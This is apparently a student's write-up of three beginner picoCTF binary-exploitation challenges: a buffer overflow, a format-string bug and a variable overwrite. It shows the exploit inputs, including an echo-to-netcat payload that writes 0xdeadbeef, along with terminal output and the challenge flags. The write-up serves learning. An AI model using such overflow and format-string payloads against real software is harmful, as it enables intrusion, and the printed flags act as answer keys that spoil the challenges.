# 1. Buffer Overflow 0
> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. Additional details will be available after launching your challenge instance.

## Solution:

- Looking at the code, I saw that the input was being copied to a string of max size 16. To break the program, I just had to input a string have more than 16 characters.
```
sid@sidsAsusZenbook:~/cryptoTP$ nc saturn.picoctf.net 62468
Input: hi
The program will exit now
ok
sid@sidsAsusZenbook:~/cryptoTP$ nc saturn.picoctf.net 62468
Input: dfjfdjfdnkjfnkdjndkjfndfkgjnfdkjnlsfdgkjndfjknckzljdflkjfdnkjnlkcjndafjlfddsflakjdbsfkjlbnflkdgjfkldchjkndflkdjgfkdfldsclkfkdnkcjdandjkfbdjkfnslrkfjhdfslihdfgjkcnd
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:
- Buffers

## Notes:

- After completing the challenge, I ran it a few times again to see that a string with 17 characters does not print the flag. I don't understand how many characters exactly are needed to overflow the buffer.

## Resources:

- Learnt about buffers [here.](https://ctf101.org/binary-exploitation/what-are-buffers/)

<br><br><br>
***
<br><br><br>


# 2. Format String 0

> Can you use your knowledge of format strings to make the customers happy? Download the binary here. Download the source here. Connect with the challenge instance here: nc mimas.picoctf.net 59043

## Solution:

- Probably the easiest challenge till now. For the first choice, %114d is a valid format specifier in C. After examining the code, I found out that I just needed the string length to exceed 64. `%114d` fill in any garbage value of 114 digits in length. For the second choice, the text talks about _breaking_ the shop. `Cla%sic_Che%s%steak` will break the program as there are no values passed to it in the printf statement.

```
sid@sidsAsusZenbook:~/cryptoTP$ nc mimas.picoctf.net 62362
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}

```

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

## Concepts learnt:

- Format specifiers in C

## Notes:

- This could've been solved by a simply hit and trial as well.
- I don't understand why the binary for the code was provided.

## Resources:
- [This](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) was provided in the PDF and helped me to understand what the challenge could be about.

  
<br><br><br>
***
<br><br><br>


# 3. Clutter Over-flow

> Clutter, clutter everywhere and not a byte to use. nc mars.picoctf.net 31890

## Solution:
- I read the source code and found out that the code variable was being compared to the "GOAL", hex value 0xdeadbeef.
- On further understanding the code, I realised that I was typing out the code variable after 256+8 characters of input.
- Since the size of the input variable was set to 256, doing trial and error after that made me realise the above.
- After finding this out, I had to print the hex value of GOAL in the string. This could be done through escape sequences.
- I then ran the following code and got the flag.
  
```
echo -e 'hruudmmchxkearjpcbctzmnqihawizabapehwhfamvvbcqttwhdzjptzdztbfffrwwctcypyhrkkegkmpftmvrtxcviydufwibbdhycwgcheifvqdxtruudctpxykubrjjaezaehacwketpnzitwrtnactnxvwtagvidpxdrndtxzuieckdkedhunnpqytkexcpamnrpbzqygfinwxqdifkgbubytpffnarujfamzekkabtqdjnrnznqheufdyrkqwertyui\xef\xbe\xad\xde' | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
sid@sidsAsusZenbook:~/cryptoTP$ 
```

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

- Escape sequences for hex characters
- Buffer lengths
- echo usage, `echo -e` considers escape sequences\
- For hex `0xdeadbeef`, the byte-sequence is `\xef\xbe\xad\xde`
  
## Notes:

- A major pain point was on figuring out how to enter the escape sequences rather than figuring out the length of the buffer.

## Resources:

- Got a string of 256 characters [here](https://pinetools.com/random-string-generator) instead of typing it out.
- Learnt a bit about buffer functions [here.](https://www.tutorialspoint.com/c_standard_library/c_function_setbuf.htm)

